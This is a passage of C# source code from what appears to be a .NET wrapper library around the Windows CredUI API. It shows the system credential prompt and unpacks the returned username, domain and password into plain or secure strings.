		/// <param name="options"></param>
		/// <param name="userName"></param>
		/// <param name="password"></param>
		/// <returns></returns>
		public static PromptCredentialsSecureStringResult PromptForCredentialsWithSecureString(PromptForCredentialsOptions options, SecureString userName, SecureString password)
		{
			return PromptForCredentialsInternal<PromptCredentialsSecureStringResult>(options, userName, password);
		}

		private static T PromptForCredentialsInternal<T>(PromptForCredentialsOptions options, SecureString userName, SecureString password) where T : class, IPromptCredentialsResult
		{
			if (options == null)
				throw new ArgumentNullException("options");
			if (userName != null && (userName.Length > NativeMethods.CREDUI_MAX_USERNAME_LENGTH))
				throw new ArgumentOutOfRangeException("userName", "CREDUI_MAX_USERNAME_LENGTH");
			if (password != null && (password.Length > NativeMethods.CREDUI_MAX_PASSWORD_LENGTH))
				throw new ArgumentOutOfRangeException("password", "CREDUI_MAX_PASSWORD_LENGTH");

			NativeMethods.CREDUI_INFO creduiInfo = new NativeMethods.CREDUI_INFO()
			{
				pszCaptionText = options.Caption,
				pszMessageText = options.Message,
				hwndParent = options.HwndParent,
				hbmBanner = options.HbmBanner
			};
			IntPtr userNamePtr = IntPtr.Zero;
			IntPtr passwordPtr = IntPtr.Zero;
			Boolean save = options.IsSaveChecked;
			try
			{
				// The maximum number of characters that can be copied to (pszUserName|szPassword) including the terminating null character.
				if (userName == null)
				{
					userNamePtr = Marshal.AllocCoTaskMem((NativeMethods.CREDUI_MAX_USERNAME_LENGTH + 1) * sizeof(Int16));
					Marshal.WriteInt16(userNamePtr, 0, 0x00);
				}
				else
				{
					userNamePtr = Marshal.SecureStringToCoTaskMemUnicode(userName);
					userNamePtr = Marshal.ReAllocCoTaskMem(userNamePtr, (NativeMethods.CREDUI_MAX_USERNAME_LENGTH + 1) * sizeof(Int16));
				}

				if (password == null)
				{
					passwordPtr = Marshal.AllocCoTaskMem((NativeMethods.CREDUI_MAX_PASSWORD_LENGTH + 1) * sizeof(Int16));
					Marshal.WriteInt16(passwordPtr, 0, 0x00);
				}
				else
				{
					passwordPtr = Marshal.SecureStringToCoTaskMemUnicode(password);
					passwordPtr = Marshal.ReAllocCoTaskMem(passwordPtr, (NativeMethods.CREDUI_MAX_PASSWORD_LENGTH + 1) * sizeof(Int16));
				}
				Marshal.WriteInt16(userNamePtr, NativeMethods.CREDUI_MAX_USERNAME_LENGTH * sizeof(Int16), 0x00);
				Marshal.WriteInt16(passwordPtr, NativeMethods.CREDUI_MAX_PASSWORD_LENGTH * sizeof(Int16), 0x00);

				var retVal = NativeMethods.CredUIPromptForCredentials(creduiInfo,
															  options.TargetName,
															  IntPtr.Zero,
															  options.AuthErrorCode,
															  userNamePtr,
															  NativeMethods.CREDUI_MAX_USERNAME_LENGTH,
															  passwordPtr,
															  NativeMethods.CREDUI_MAX_PASSWORD_LENGTH,
															  ref save,
															  options.Flags);
				switch (retVal)
				{
					case NativeMethods.CredUIPromptReturnCode.Cancelled:
						return null;
					case NativeMethods.CredUIPromptReturnCode.InvalidParameter:
						throw new Win32Exception((Int32)retVal);
					case NativeMethods.CredUIPromptReturnCode.InvalidFlags:
						throw new Win32Exception((Int32)retVal);
					case NativeMethods.CredUIPromptReturnCode.Success:
						break;
					default:
						throw new Win32Exception((Int32)retVal);
				}


				if (typeof(T) == typeof(PromptCredentialsSecureStringResult))
				{
					return new PromptCredentialsSecureStringResult
					{
						UserName = NativeMethods.PtrToSecureString(userNamePtr),
						Password = NativeMethods.PtrToSecureString(passwordPtr),
						IsSaveChecked = save
					} as T;
				}
				else
				{
					return new PromptCredentialsResult
					{
						UserName = Marshal.PtrToStringUni(userNamePtr),
						Password = Marshal.PtrToStringUni(passwordPtr),
						IsSaveChecked = save
					} as T;
				}
			}
			finally
			{
				if (userNamePtr != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
				if (passwordPtr != IntPtr.Zero)
					Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
			}
		}
		#endregion

		/// <summary>
		/// 
		/// </summary>
		[Flags]
		public enum PromptForWindowsCredentialsFlag
		{
			/// <summary>
			/// Plain text username/password is being requested
			/// </summary>
			CREDUIWIN_GENERIC = 0x00000001,
			/// <summary>
			/// Show the Save Credential checkbox
			/// </summary>
			CREDUIWIN_CHECKBOX = 0x00000002,
			/// <summary>
			/// Only Cred Providers that support the input auth package should enumerate
			/// </summary>
			CREDUIWIN_AUTHPACKAGE_ONLY = 0x00000010,
			/// <summary>
			/// Only the incoming cred for the specific auth package should be enumerated
			/// </summary>
			CREDUIWIN_IN_CRED_ONLY = 0x00000020,
			/// <summary>
			/// Cred Providers should enumerate administrators only
			/// </summary>
			CREDUIWIN_ENUMERATE_ADMINS = 0x00000100,
			/// <summary>
			/// Only the incoming cred for the specific auth package should be enumerated
			/// </summary>
			CREDUIWIN_ENUMERATE_CURRENT_USER = 0x00000200,
			/// <summary>
			/// The Credui prompt should be displayed on the secure desktop
			/// </summary>
			CREDUIWIN_SECURE_PROMPT = 0x00001000,
			/// <summary>
			/// Tell the credential provider it should be packing its Auth Blob 32 bit even though it is running 64 native
			/// </summary>
			CREDUIWIN_PACK_32_WOW = 0x10000000
		}

		/// <summary>
		/// 
		/// </summary>
		[Flags]
		public enum PromptForCredentialsFlag
		{
			/// <summary>
			/// indicates the username is valid, but password is not
			/// </summary>
			CREDUI_FLAGS_INCORRECT_PASSWORD = 0x00001,
			/// <summary>
			/// Do not show "Save" checkbox, and do not persist credentials
			/// </summary>
			CREDUI_FLAGS_DO_NOT_PERSIST = 0x00002,
			/// <summary>
			/// Populate list box with admin accounts
			/// </summary>
			CREDUI_FLAGS_REQUEST_ADMINISTRATOR = 0x00004,
			/// <summary>
			/// do not include certificates in the drop list
			/// </summary>
			CREDUI_FLAGS_EXCLUDE_CERTIFICATES = 0x00008,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_REQUIRE_CERTIFICATE = 0x00010,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_SHOW_SAVE_CHECK_BOX = 0x00040,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_ALWAYS_SHOW_UI = 0x00080,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_REQUIRE_SMARTCARD = 0x00100,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_PASSWORD_ONLY_OK = 0x00200,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_VALIDATE_USERNAME = 0x00400,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_COMPLETE_USERNAME = 0x00800,
			/// <summary>
			/// Do not show "Save" checkbox, but persist credentials anyway
			/// </summary>
			CREDUI_FLAGS_PERSIST = 0x01000,
			/// <summary>
			/// 
			/// </summary>
			CREDUI_FLAGS_SERVER_CREDENTIAL = 0x04000,
			/// <summary>
			/// do not persist unless caller later confirms credential via CredUIConfirmCredential() api
			/// </summary>
			CREDUI_FLAGS_EXPECT_CONFIRMATION = 0x20000,
			/// <summary>
			/// Credential is a generic credential
			/// </summary>
			CREDUI_FLAGS_GENERIC_CREDENTIALS = 0x40000,
			/// <summary>
			/// Credential has a username as the target
			/// </summary>
			CREDUI_FLAGS_USERNAME_TARGET_CREDENTIALS = 0x80000,
			/// <summary>
			/// don't allow the user to change the supplied username
			/// </summary>
			CREDUI_FLAGS_KEEP_USERNAME = 0x100000
		}

		/// <summary>
		/// 
		/// </summary>
		public class PromptForWindowsCredentialsOptions
		{
			private String _caption;
			private String _message;
			public String Caption
			{
				get { return _caption; }
				set
				{
					if (value.Length > NativeMethods.CREDUI_MAX_CAPTION_LENGTH)
						throw new ArgumentOutOfRangeException("value");
					_caption = value;
				}
			}
			public String Message
			{
				get { return _message; }
				set
				{
					if (value.Length > NativeMethods.CREDUI_MAX_MESSAGE_LENGTH)
						throw new ArgumentOutOfRangeException("value");
					_message = value;
				}
			}
			public IntPtr HwndParent { get; set; }
			public IntPtr HbmBanner { get; set; }
			public Boolean IsSaveChecked { get; set; }
			public PromptForWindowsCredentialsFlag Flags { get; set; }
			public Int32 AuthErrorCode { get; set; }
			public PromptForWindowsCredentialsOptions(String caption, String message)
			{
				if (String.IsNullOrEmpty(caption))
					throw new ArgumentNullException("caption");
				if (String.IsNullOrEmpty(message))
					throw new ArgumentNullException("message");
				Caption = caption;
				Message = message;
				Flags = PromptForWindowsCredentialsFlag.CREDUIWIN_GENERIC;
			}
		}
		/// <summary>
		/// 
		/// </summary>
		public class PromptForCredentialsOptions
		{
			private String _caption;
			private String _message;
			public String Caption
			{
				get { return _caption; }
				set
				{
					if (value.Length > NativeMethods.CREDUI_MAX_CAPTION_LENGTH)
						throw new ArgumentOutOfRangeException("value");
					_caption = value;
				}
			}
			public String Message
			{
				get { return _message; }
				set
				{
					if (value.Length > NativeMethods.CREDUI_MAX_MESSAGE_LENGTH)
						throw new ArgumentOutOfRangeException("value");
					_message = value;
				}
			}
			public String TargetName { get; set; }
			public IntPtr HwndParent { get; set; }
			public IntPtr HbmBanner { get; set; }
			public Boolean IsSaveChecked { get; set; }
			public PromptForCredentialsFlag Flags { get; set; }
			public Int32 AuthErrorCode { get; set; }
			public PromptForCredentialsOptions(String targetName, String caption, String message)
			{
				// target name may be empty.
				if (String.IsNullOrEmpty(caption))
					throw new ArgumentNullException("caption");
				if (String.IsNullOrEmpty(message))
					throw new ArgumentNullException("message");

				TargetName = targetName;
				Caption = caption;
				Message = message;
				Flags = PromptForCredentialsFlag.CREDUI_FLAGS_GENERIC_CREDENTIALS | PromptForCredentialsFlag.CREDUI_FLAGS_DO_NOT_PERSIST;
			}
		}

		private static class NativeMethods
		{
			public const Int32 CREDUI_MAX_MESSAGE_LENGTH = 32767;
			public const Int32 CREDUI_MAX_CAPTION_LENGTH = 128;
			public const Int32 CRED_MAX_USERNAME_LENGTH = (256 + 1 + 256);
			public const Int32 CREDUI_MAX_USERNAME_LENGTH = CRED_MAX_USERNAME_LENGTH;
			public const Int32 CREDUI_MAX_PASSWORD_LENGTH = (512 / 2);

			public enum CredUIPromptReturnCode
			{
				Success = 0,
				Cancelled = 1223,
				InvalidParameter = 87,
				InvalidFlags = 1004
			}

			[StructLayout(LayoutKind.Sequential)]
			public class CREDUI_INFO
			{
				public Int32 cbSize;
				public IntPtr hwndParent;
				[MarshalAs(UnmanagedType.LPWStr)]
				public String pszMessageText;
				[MarshalAs(UnmanagedType.LPWStr)]
				public String pszCaptionText;
				public IntPtr hbmBanner;

				public CREDUI_INFO()
				{
					cbSize = Marshal.SizeOf(typeof(CREDUI_INFO));
				}
			}

			//
			// CredUIPromptForCredentials -------------------------------------
			//
			[DllImport("credui.dll", CharSet = CharSet.Unicode)]
			public static extern CredUIPromptReturnCode CredUIPromptForCredentials(
				CREDUI_INFO pUiInfo,
				String pszTargetName,
				IntPtr Reserved,
				Int32 dwAuthError,
				IntPtr pszUserName,
				Int32 ulUserNameMaxChars,
				IntPtr pszPassword,
				Int32 ulPasswordMaxChars,
				ref Boolean pfSave,
				PromptForCredentialsFlag dwFlags
			);

			//
			// CredUIPromptForWindowsCredentials ------------------------------
			//
			[DllImport("credui.dll", CharSet = CharSet.Unicode)]
			public static extern CredUIPromptReturnCode
			CredUIPromptForWindowsCredentials(
				CREDUI_INFO pUiInfo,
				Int32 dwAuthError,
				ref Int32 pulAuthPackage,
				IntPtr pvInAuthBuffer,
				Int32 ulInAuthBufferSize,
				out IntPtr ppvOutAuthBuffer,
				out Int32 pulOutAuthBufferSize,
				ref Boolean pfSave,
				PromptForWindowsCredentialsFlag dwFlags
			);

			[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern Boolean CredPackAuthenticationBuffer(
				Int32 dwFlags,
				String pszUserName,
				String pszPassword,
				IntPtr pPackedCredentials,
				ref Int32 pcbPackedCredentials
			);
			[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern Boolean CredPackAuthenticationBuffer(
				Int32 dwFlags,
				IntPtr pszUserName,
				IntPtr pszPassword,
				IntPtr pPackedCredentials,
				ref Int32 pcbPackedCredentials
			);

			[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern Boolean CredUnPackAuthenticationBuffer(
				Int32 dwFlags,
				IntPtr pAuthBuffer,
				Int32 cbAuthBuffer,
				StringBuilder pszUserName,
				ref Int32 pcchMaxUserName,
				StringBuilder pszDomainName,
				ref Int32 pcchMaxDomainame,
				StringBuilder pszPassword,
				ref Int32 pcchMaxPassword
			);
			[DllImport("credui.dll", CharSet = CharSet.Unicode, SetLastError = true)]
			public static extern Boolean CredUnPackAuthenticationBuffer(
				Int32 dwFlags,
				IntPtr pAuthBuffer,
				Int32 cbAuthBuffer,
				IntPtr pszUserName,
				ref Int32 pcchMaxUserName,
				IntPtr pszDomainName,
				ref Int32 pcchMaxDomainame,
				IntPtr pszPassword,
				ref Int32 pcchMaxPassword
			);

			public static PromptCredentialsResult CredUnPackAuthenticationBufferWrap(Boolean decryptProtectedCredentials, IntPtr authBufferPtr, Int32 authBufferSize)
			{
				StringBuilder sbUserName = new StringBuilder(255);
				StringBuilder sbDomainName = new StringBuilder(255);
				StringBuilder sbPassword = new StringBuilder(255);
				Int32 userNameSize = sbUserName.Capacity;
				Int32 domainNameSize = sbDomainName.Capacity;
				Int32 passwordSize = sbPassword.Capacity;

				//#define CRED_PACK_PROTECTED_CREDENTIALS      0x1
				//#define CRED_PACK_WOW_BUFFER                 0x2
				//#define CRED_PACK_GENERIC_CREDENTIALS        0x4

				Boolean result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
																authBufferPtr,
																authBufferSize,
																sbUserName,
																ref userNameSize,
																sbDomainName,
																ref domainNameSize,
																sbPassword,
																ref passwordSize
																);
				if (!result)
				{
					var win32Error = Marshal.GetLastWin32Error();
					if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
					{
						sbUserName.Capacity = userNameSize;
						sbPassword.Capacity = passwordSize;
						sbDomainName.Capacity = domainNameSize;
						result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
																authBufferPtr,
																authBufferSize,
																sbUserName,
																ref userNameSize,
																sbDomainName,
																ref domainNameSize,
																sbPassword,
																ref passwordSize
																);
						if (!result)
						{
							throw new Win32Exception(Marshal.GetLastWin32Error());
						}
					}
					else
					{
						throw new Win32Exception(win32Error);
					}
				}

				return new PromptCredentialsResult
				{
					UserName = sbUserName.ToString(),
					DomainName = sbDomainName.ToString(),
					Password = sbPassword.ToString()
				};
			}

			public static PromptCredentialsSecureStringResult CredUnPackAuthenticationBufferWrapSecureString(Boolean decryptProtectedCredentials, IntPtr authBufferPtr, Int32 authBufferSize)
			{
				Int32 userNameSize = 255;
				Int32 domainNameSize = 255;
				Int32 passwordSize = 255;
				IntPtr userNamePtr = IntPtr.Zero;
				IntPtr domainNamePtr = IntPtr.Zero;
				IntPtr passwordPtr = IntPtr.Zero;
				try
				{
					userNamePtr = Marshal.AllocCoTaskMem(userNameSize);
					domainNamePtr = Marshal.AllocCoTaskMem(domainNameSize);
					passwordPtr = Marshal.AllocCoTaskMem(passwordSize);

					//#define CRED_PACK_PROTECTED_CREDENTIALS      0x1
					//#define CRED_PACK_WOW_BUFFER                 0x2
					//#define CRED_PACK_GENERIC_CREDENTIALS        0x4

					Boolean result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
																	authBufferPtr,
																	authBufferSize,
																	userNamePtr,
																	ref userNameSize,
																	domainNamePtr,
																	ref domainNameSize,
																	passwordPtr,
																	ref passwordSize
																	);
					if (!result)
					{
						var win32Error = Marshal.GetLastWin32Error();
						if (win32Error == 122 /*ERROR_INSUFFICIENT_BUFFER*/)
						{
							userNamePtr = Marshal.ReAllocCoTaskMem(userNamePtr, userNameSize);
							domainNamePtr = Marshal.ReAllocCoTaskMem(domainNamePtr, domainNameSize);
							passwordPtr = Marshal.ReAllocCoTaskMem(passwordPtr, passwordSize);
							result = CredUnPackAuthenticationBuffer((decryptProtectedCredentials ? 0x1 : 0x0),
																	authBufferPtr,
																	authBufferSize,
																	userNamePtr,
																	ref userNameSize,
																	domainNamePtr,
																	ref domainNameSize,
																	passwordPtr,
																	ref passwordSize);
							if (!result)
							{
								throw new Win32Exception(Marshal.GetLastWin32Error());
							}
						}
						else
						{
							throw new Win32Exception(win32Error);
						}
					}

					return new PromptCredentialsSecureStringResult
					{
						UserName = PtrToSecureString(userNamePtr, userNameSize),
						DomainName = PtrToSecureString(domainNamePtr, domainNameSize),
						Password = PtrToSecureString(passwordPtr, passwordSize)
					};
				}
				finally
				{
					if (userNamePtr != IntPtr.Zero)
						Marshal.ZeroFreeCoTaskMemUnicode(userNamePtr);
					if (domainNamePtr != IntPtr.Zero)
						Marshal.ZeroFreeCoTaskMemUnicode(domainNamePtr);
					if (passwordPtr != IntPtr.Zero)
						Marshal.ZeroFreeCoTaskMemUnicode(passwordPtr);
				}
			}

			#region Utility Methods
			public static SecureString PtrToSecureString(IntPtr p)
			{
				SecureString s = new SecureString();
				Int32 i = 0;
				while (true)
				{
					Char c = (Char)Marshal.ReadInt16(p, ((i++) * sizeof(Int16)));
					if (c == '\u0000')
						break;
					s.AppendChar(c);
				}
				s.MakeReadOnly();
				return s;
			}
			public static SecureString PtrToSecureString(IntPtr p, Int32 length)
			{
				SecureString s = new SecureString();
				for (var i = 0; i < length; i++)
					s.AppendChar((Char)Marshal.ReadInt16(p, i * sizeof(Int16)));
				s.MakeReadOnly();
				return s;
			}
			#endregion
		}
	}

	/// <summary>
	/// 
	/// </summary>
	public interface IPromptCredentialsResult
	{
	}
	/// <summary>
	/// 
	/// </summary>
	public class PromptCredentialsResult : IPromptCredentialsResult
	{
		public String UserName { get; internal set; }
		public String DomainName { get; internal set; }
		public String Password { get; internal set; }
		public Boolean IsSaveChecked { get; set; }
	}
	/// <summary>
	/// 
	/// </summary>
	public class PromptCredentialsSecureStringResult : IPromptCredentialsResult
	{
		public SecureString UserName { get; internal set; }
		public SecureString DomainName { get; internal set; }
		public SecureString Password { get; internal set; }
		public Boolean IsSaveChecked { get; set; }
	}

	
	public static class ExtensionMethods
	{
		public static SecureString ToSecureString(this string src)
		{
			SecureString result = new SecureString();
			src.ToCharArray().ToList().ForEach(c => result.AppendChar(c));
			return result;
		}
	}

}
